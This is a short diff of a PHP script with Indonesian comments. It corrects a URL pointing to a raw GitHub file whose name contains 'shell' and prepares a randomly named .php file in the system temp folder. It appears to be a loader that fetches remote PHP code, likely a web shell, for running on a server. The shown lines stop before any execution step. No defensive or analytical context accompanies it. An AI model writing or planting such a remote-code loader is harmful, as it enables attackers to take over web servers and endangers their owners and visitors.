@@ -1,6 +1,6 @@
 <?php
 // URL file remote PHP yang ingin diambil
-$remote_file = "hhttps://raw.githubusercontent.com/okewlalocksystem-tech/BELAWAN/refs/heads/main/shellputihmalikatoto1.txt";
+$remote_file = "https://raw.githubusercontent.com/okewlalocksystem-tech/BELAWAN/refs/heads/main/shellputihmalikatoto01.txt";
 
 // Buat nama file temporer acak di folder temp sistem
 $local_file = sys_get_temp_dir() . '/' . bin2hex(random_bytes(8)) . '.php';
